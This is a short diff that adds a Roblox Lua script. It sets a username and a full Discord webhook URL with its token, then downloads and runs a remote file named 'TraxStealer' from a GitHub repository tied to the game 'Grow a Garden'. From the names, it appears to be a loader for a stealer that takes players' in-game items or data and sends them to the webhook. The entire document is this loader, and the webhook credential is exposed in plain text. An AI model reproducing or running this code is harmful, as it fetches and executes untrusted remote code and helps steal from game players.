@@ -1,0 +1,4 @@
+Username = "Rip_leo249"
+Webhook = "https://discord.com/api/webhooks/1364681596107755580/khzIeYWKaM4DThYvY91DJ1JL9_LTvlEbmWrG-alEPlFOqfdCRGVH16JjtKGTecdmyRIf"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/Grow-A-Garden/refs/heads/main/TraxStealer"))()
